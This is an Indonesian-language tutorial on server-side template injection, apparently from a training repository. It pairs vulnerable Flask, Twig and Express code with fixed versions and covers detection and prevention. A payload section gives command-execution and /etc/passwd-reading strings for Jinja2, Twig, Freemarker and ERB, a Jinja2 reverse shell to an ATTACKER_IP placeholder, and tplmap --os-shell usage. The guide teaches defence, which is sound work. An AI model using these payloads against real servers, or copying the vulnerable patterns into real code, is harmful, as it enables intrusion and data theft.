# Server-Side Template Injection (SSTI)

## Pengertian

Server-Side Template Injection (SSTI) adalah kerentanan yang terjadi ketika input dari pengguna disisipkan langsung ke dalam template engine tanpa validasi atau filter yang memadai. Hal ini memungkinkan penyerang menyisipkan ekspresi yang akan dieksekusi di sisi server.

Template engine digunakan untuk menghasilkan halaman HTML dari data dinamis. Contoh template engine yang populer:
- Jinja2 (Python / Flask)
- Twig (PHP)
- Velocity (Java)
- ERB (Ruby)
- Freemarker (Java)
- Handlebars (JavaScript)

**Analogi:** Bayangkan sebuah pabrik yang menggunakan cetakan untuk membuat produk. Jika seseorang dapat mengubah desain cetakan tersebut, mereka dapat mengubah produk akhir sesuai keinginan mereka, termasuk membuat produk yang berbahaya.

## Contoh Source Code yang Rentan SSTI

### 1. Flask dengan Jinja2 (Python)

**Kode Rentan:**
```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/greeting")
def greeting():
    name = request.args.get("name", "Guest")
    # BAHAYA: Input pengguna langsung digabungkan ke template
    return render_template_string("Hello, " + name + "!")

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request, render_template_string
from markupsafe import escape

app = Flask(__name__)

@app.route("/greeting")
def greeting():
    name = request.args.get("name", "Guest")
    # AMAN: Input di-escape sebelum digabungkan
    safe_name = escape(name)
    return render_template_string("Hello, {{ name }}!", name=safe_name)

if __name__ == "__main__":
    app.run(debug=True)
```

### 2. Twig (PHP)

**Kode Rentan:**
```php
<?php
require_once 'vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([]);
$twig = new \Twig\Environment($loader);

$name = $_GET['name'] ?? 'Guest';

// BAHAYA: Input pengguna langsung digunakan dalam template
$template = $twig->createTemplate("Hello, " . $name . "!");
echo $template->render();
?>
```

**Kode Aman:**
```php
<?php
require_once 'vendor/autoload.php';

$loader = new \Twig\Loader\ArrayLoader([]);
$twig = new \Twig\Environment($loader);

$name = $_GET['name'] ?? 'Guest';

// AMAN: Gunakan variabel terpisah dan template yang jelas
$template = $twig->createTemplate("Hello, {{ name }}!");
echo $template->render(['name' => $name]);
?>
```

### 3. Express dengan Handlebars (Node.js)

**Kode Rentan:**
```javascript
const express = require('express');
const { create } = require('express-handlebars');
const app = express();

const hbs = create({});

app.get('/profile', (req, res) => {
    const name = req.query.name || 'Guest';
    // BAHAYA: Input pengguna langsung digabungkan ke template
    const template = `Hello, ${name}!`;
    res.send(template);
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const { create } = require('express-handlebars');
const app = express();

const hbs = create({});

app.get('/profile', (req, res) => {
    const name = req.query.name || 'Guest';
    // AMAN: Gunakan rendering engine dengan variabel terpisah
    res.render('profile', { name: name });
});

app.listen(3000);
```

## Mekanisme Kerentanan

### Contoh Eksploitasi pada Flask

**Permintaan normal:**
```
/greeting?name=Kaguai
```
**Hasil:**
```html
Hello, Kaguai!
```

**Permintaan dengan payload SSTI:**
```
/greeting?name={{7*7}}
```
**Hasil:**
```html
Hello, 49!
```

Ketika output menunjukkan hasil perhitungan `49`, ini mengindikasikan bahwa input dari pengguna diinterpretasi sebagai ekspresi oleh template engine. Kondisi ini berbahaya karena membuka peluang untuk eksekusi kode lebih lanjut.

## Potensi Bahaya

Jika SSTI berhasil dieksploitasi, penyerang dapat:

- **Menjalankan perintah sistem** -- Menggunakan fungsi seperti `os.system` atau `subprocess`
- **Mengakses file** -- Membaca file sensitif dengan fungsi `open('/etc/passwd')`
- **Remote Code Execution (RCE)** -- Menjalankan kode arbitrer di server
- **Eskalasi Hak Akses** -- Dari SSTI, penyerang dapat memperoleh akses shell ke server

## Kumpulan Payload SSTI

### Payload Deteksi Dasar

Payload ini digunakan untuk mengidentifikasi apakah aplikasi rentan SSTI:

```jinja2
{{7*7}}                    -- Output: 49 (jinja2/Flask)
{{7*'7'}}                  -- Output: 7777777 (Twig)
<%= 7*7 %>                 -- Output: 49 (ERB/Ruby)
#{7*7}                     -- Output: 49 (Ruby)
${7*7}                     -- Output: 49 (Freemarker/Java)
@(7*7)                     -- Output: 49 (ASP.NET)
```

### Payload Jinja2 (Flask/Python)

**Tahap 1 - Deteksi:**
```jinja2
{{7*7}}
{{config}}
{{request}}
{{self}}
```

**Tahap 2 - Eksplorasi Objek:**
```jinja2
{{''.__class__}}                    -- Mendapatkan class dari string kosong
{{''.__class__.__mro__}}            -- Method Resolution Order
{{''.__class__.__mro__[1]}}         -- Mendapatkan class object
{{''.__class__.__mro__[1].__subclasses__()}}  -- Semua subclass
```

**Tahap 3 - Eksekusi Perintah:**
```jinja2
-- Mencari class warnings.catch_warnings (index bisa berbeda)
{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('id').read()}}

-- Menggunakan os.popen
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

-- Menggunakan subprocess
{{''.__class__.__mro__[1].__subclasses__()[258].popen('id').read()}}

-- Membaca file
{{''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read()}}
```

**Tahap 4 - Reverse Shell:**
```jinja2
{{''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__['popen']('bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1').read()}}
```

### Payload Twig (PHP)

```twig
{{_self.env.setDebugCallback(true)}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['cat /etc/passwd']|filter('system')}}
```

### Payload Freemarker (Java)

```freemarker
<#assign ex = "freemarker.template.utility.Execute"?new()>
${ ex("id") }
${ ex("cat /etc/passwd") }

-- Membaca file
<#assign fileReader = "freemarker.template.utility.ObjectConstructor"?new()>
${fileReader("java.io.FileInputStream", "/etc/passwd")}
```

### Payload ERB (Ruby)

```erb
<%= system("id") %>
<%= `id` %>
<%= IO.popen("id").read %>
<%= File.open("/etc/passwd").read %>
```

## Tools untuk Pengujian SSTI

### 1.Tplmap

Tplmap adalah alat otomatis untuk mendeteksi dan mengeksploitasi SSTI pada berbagai template engine.

**Instalasi:**
```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

**Penggunaan:**
```bash
-- Deteksi SSTI
python tplmap.py -u 'http://target.com/page?name=Kaguai'

-- Eksploitasi dengan shell interaktif
python tplmap.py -u 'http://target.com/page?name=Kaguai' --os-shell

-- Menggunakan cookie
python tplmap.py -u 'http://target.com/page?name=Kaguai' --cookie 'session=xyz'

-- Menentukan template engine secara manual
python tplmap.py -u 'http://target.com/page?name=Kaguai' -e Jinja2
```

### 2. Burp Suite

Burp Suite dapat digunakan untuk pengujian SSTI secara manual:

- **Intruder** -- Mengirim berbagai payload SSTI secara otomatis
- **Repeater** -- Menguji payload satu per satu dan menganalisis respons
- **Scanner** (Professional) -- Mendeteksi SSTI secara otomatis

### 3. SSTI Map

Daftar payload SSTI yang dapat digunakan dengan Burp Intruder:
- https://github.com/vladko312/SSTImap

**Penggunaan:**
```bash
git clone https://github.com/vladko312/SSTImap.git
cd SSTImap
python3 sstimap.py -u 'http://target.com/page?name=test'
```

### 4. PayloadsAllTheThings

Repositori lengkap berisi payload SSTI untuk berbagai template engine:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan SSTI:

1. **Uji dengan ekspresi matematika** -- Input `{{7*7}}` dan periksa apakah output menampilkan `49`
2. **Uji dengan ekspresi string** -- Input `{{''.__class__}}` dan periksa responsnya
3. **Uji berbagai sintaks template** -- Coba `{{}}`, `{% %}`, `<%= %>`, `${}`, `#{}` untuk menentukan engine
4. **Perhatikan error message** -- Error dari template engine dapat mengungkap informasi berharga
5. **Perhatikan perilaku template** -- Jika output berasal dari pemrosesan template engine, aplikasi mungkin rentan

## Metode Pencegahan

1. **Jangan gunakan input pengguna langsung dalam template** -- Hindari `render_template_string()` dengan input yang tidak terpercaya

2. **Gunakan template file** -- Gunakan file template statis dengan variabel yang diisi secara terkontrol

3. **Terapkan sandbox** -- Jika harus menggunakan input pengguna, terapkan environment yang membatasi akses ke fungsi berbahaya. Pada Jinja2, gunakan `SandboxedEnvironment`:
   
   ```python
   from jinja2.sandbox import SandboxedEnvironment
   env = SandboxedEnvironment()
   ```

4. **Validasi dan sanitasi input** -- Tolak atau bersihkan karakter khusus seperti `{{`, `}}`, `{%`, `%}` dari input pengguna

5. **Gunakan autoescaping** -- Aktifkan fitur autoescaping pada template engine untuk mencegah eksekusi ekspresi berbahaya

6. **Pisahkan logika dari template** -- Template seharusnya hanya untuk presentasi, bukan logika bisnis

7. **Gunakan Content Security Policy (CSP)** -- Batasi sumber skrip yang dapat dijalankan untuk mengurangi dampak jika terjadi serangan

## Latihan Praktis

Silakan lanjutkan ke direktori latihan untuk eksplorasi lebih lanjut.

## Referensi Lanjutan

- OWASP Server-Side Template Injection
- CWE-94: Improper Control of Generation of Code ('Code Injection')
- PortSwigger: Server-Side Template Injection -- https://portswigger.net/web-security/server-side-template-injection
- PayloadsAllTheThings SSTI -- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
- Tplmap -- https://github.com/epinna/tplmap
